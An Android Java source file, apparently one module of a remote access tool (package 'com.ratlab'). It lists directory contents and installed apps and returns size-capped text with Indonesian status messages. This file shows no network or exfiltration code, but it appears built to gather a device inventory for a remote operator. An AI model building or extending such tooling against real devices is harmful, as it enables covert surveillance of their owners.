package com.ratlab;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.List;

public class FileModule {

    private final Context ctx;

    public FileModule(Context ctx) {
        this.ctx = ctx;
    }

    public String list(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return "Path tidak ada";
            StringBuilder sb = new StringBuilder();
            File[] files = dir.listFiles();
            if (files == null) return "Tidak bisa baca folder";
            for (File f : files) {
                sb.append(f.isDirectory() ? "[D] " : "[F] ");
                sb.append(f.getName()).append(" (").append(f.length()).append(" B)\n");
                if (sb.length() > 3500) { sb.append("... (dipotong)"); break; }
            }
            return sb.length() == 0 ? "Kosong" : sb.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    public String listApps() {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            StringBuilder sb = new StringBuilder();
            for (ApplicationInfo ai : apps) {
                sb.append(pm.getApplicationLabel(ai)).append(" — ").append(ai.packageName).append("\n");
                if (sb.length() > 3500) { sb.append("... (dipotong)"); break; }
            }
            return sb.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
